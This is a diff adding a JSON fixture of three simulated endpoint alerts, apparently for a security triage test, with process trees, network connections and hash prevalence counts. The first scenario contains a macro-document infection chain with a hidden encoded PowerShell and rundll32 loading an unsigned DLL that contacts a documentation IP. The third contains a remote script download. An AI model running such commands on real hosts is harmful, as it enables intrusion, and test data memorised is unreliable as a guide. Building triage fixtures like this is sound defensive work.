@@ -1,0 +1,180 @@
+{
+  "scenarios": {
+    "ALERT-ATTACK-001": {
+      "host": {
+        "device_id": "dev-7f21",
+        "hostname": "FIN-WS-0231",
+        "os": "Windows 11 24H2",
+        "last_seen": "2026-11-05T15:02:00Z",
+        "ou_or_group": "Workstations/Finance",
+        "tags": [
+          "finance"
+        ]
+      },
+      "tree": [
+        {
+          "pid": "p1",
+          "name": "explorer.exe",
+          "cmdline": "C:\\Windows\\explorer.exe",
+          "sha256": "1c467339c960a107ab9ee5ff63b38009797416c964f988b224710773cc38796a",
+          "user": "CORP\\jdoe",
+          "signed": true
+        },
+        {
+          "pid": "p2",
+          "name": "WINWORD.EXE",
+          "cmdline": "\"WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_4471.docm\"",
+          "sha256": "0c7202275ade61aaec5b13be2ce37e640352ad0346e34322d1086980fa6c975c",
+          "user": "CORP\\jdoe",
+          "parent_pid": "p1",
+          "signed": true
+        },
+        {
+          "pid": "p3",
+          "name": "powershell.exe",
+          "cmdline": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+          "sha256": "86f51b17077aee2d7885528286a00aa632489cfee188cc99fbec881feb06dca7",
+          "user": "CORP\\jdoe",
+          "parent_pid": "p2",
+          "signed": true
+        },
+        {
+          "pid": "p4",
+          "name": "rundll32.exe",
+          "cmdline": "rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd4471.dll,DllRegisterServer",
+          "sha256": "29fdefe98feb6ccf1607830920797de1369e1e74bd27180c04637993d95965e4",
+          "user": "CORP\\jdoe",
+          "parent_pid": "p3",
+          "signed": true
+        },
+        {
+          "pid": "p5",
+          "name": "upd4471.dll",
+          "cmdline": "",
+          "sha256": "f5dd16fb0257d341ee2c810f3f95baf30ae6dce9425d0e6a3b26a7035a45a2c1",
+          "user": "CORP\\jdoe",
+          "parent_pid": "p4",
+          "signed": false
+        }
+      ],
+      "netconns": [
+        {
+          "pid": "p3",
+          "remote_ip": "",
+          "domain": "files-share-cdn.test",
+          "direction": "dns"
+        },
+        {
+          "pid": "p4",
+          "remote_ip": "203.0.113.45",
+          "remote_port": 443
+        }
+      ]
+    },
+    "ALERT-ADMIN-002": {
+      "host": {
+        "device_id": "dev-0a11",
+        "hostname": "ADM-JMP-02",
+        "os": "Windows Server 2022",
+        "last_seen": "2026-11-05T15:01:00Z",
+        "ou_or_group": "Servers/PAW",
+        "tags": [
+          "paw",
+          "jump"
+        ]
+      },
+      "tree": [
+        {
+          "pid": "a1",
+          "name": "mmc.exe",
+          "cmdline": "mmc.exe",
+          "sha256": "d528922e9c007497cd062185a01363c12fa21478b08f580f8da89ae109b08f15",
+          "user": "CORP\\adm-rsmith",
+          "signed": true
+        },
+        {
+          "pid": "a2",
+          "name": "powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+          "sha256": "86f51b17077aee2d7885528286a00aa632489cfee188cc99fbec881feb06dca7",
+          "user": "CORP\\adm-rsmith",
+          "parent_pid": "a1",
+          "signed": true
+        },
+        {
+          "pid": "a3",
+          "name": "net.exe",
+          "cmdline": "net group \"Domain Admins\" /domain",
+          "sha256": "a08a0fcbdeafd3c1b3a4b495b9a9c9d96850f08946b52bc0622347d3b6e73b78",
+          "user": "CORP\\adm-rsmith",
+          "parent_pid": "a2",
+          "signed": true
+        }
+      ],
+      "netconns": [
+        {
+          "pid": "a2",
+          "remote_ip": "198.51.100.10",
+          "remote_port": 5985
+        }
+      ]
+    },
+    "ALERT-GREY-003": {
+      "host": {
+        "device_id": "dev-3c90",
+        "hostname": "OPS-WS-0110",
+        "os": "Windows 11 24H2",
+        "last_seen": "2026-11-05T15:00:00Z",
+        "ou_or_group": "Workstations/Ops",
+        "tags": []
+      },
+      "tree": [
+        {
+          "pid": "g1",
+          "name": "cmd.exe",
+          "cmdline": "cmd.exe",
+          "sha256": "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66",
+          "user": "CORP\\adm-tlee",
+          "signed": true
+        },
+        {
+          "pid": "g2",
+          "name": "powershell.exe",
+          "cmdline": "powershell.exe -c iwr https://tools.example/agent.ps1 -OutFile C:\\ProgramData\\agent.ps1",
+          "sha256": "86f51b17077aee2d7885528286a00aa632489cfee188cc99fbec881feb06dca7",
+          "user": "CORP\\adm-tlee",
+          "parent_pid": "g1",
+          "signed": true
+        },
+        {
+          "pid": "g3",
+          "name": "whoami.exe",
+          "cmdline": "whoami /all",
+          "sha256": "f25297859cf0a70af5c053a5464a5fa647a35ceee1d91397331903846d79ffc1",
+          "user": "CORP\\adm-tlee",
+          "parent_pid": "g2",
+          "signed": true
+        }
+      ],
+      "netconns": [
+        {
+          "pid": "g2",
+          "remote_ip": "198.51.100.77",
+          "remote_port": 443,
+          "domain": "tools.example"
+        }
+      ]
+    }
+  },
+  "prevalence": {
+    "1c467339c960a107ab9ee5ff63b38009797416c964f988b224710773cc38796a": 48000,
+    "0c7202275ade61aaec5b13be2ce37e640352ad0346e34322d1086980fa6c975c": 41000,
+    "86f51b17077aee2d7885528286a00aa632489cfee188cc99fbec881feb06dca7": 47000,
+    "29fdefe98feb6ccf1607830920797de1369e1e74bd27180c04637993d95965e4": 48000,
+    "f5dd16fb0257d341ee2c810f3f95baf30ae6dce9425d0e6a3b26a7035a45a2c1": 1,
+    "d528922e9c007497cd062185a01363c12fa21478b08f580f8da89ae109b08f15": 9000,
+    "a08a0fcbdeafd3c1b3a4b495b9a9c9d96850f08946b52bc0622347d3b6e73b78": 48000,
+    "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66": 48000,
+    "f25297859cf0a70af5c053a5464a5fa647a35ceee1d91397331903846d79ffc1": 30000
+  }
+}
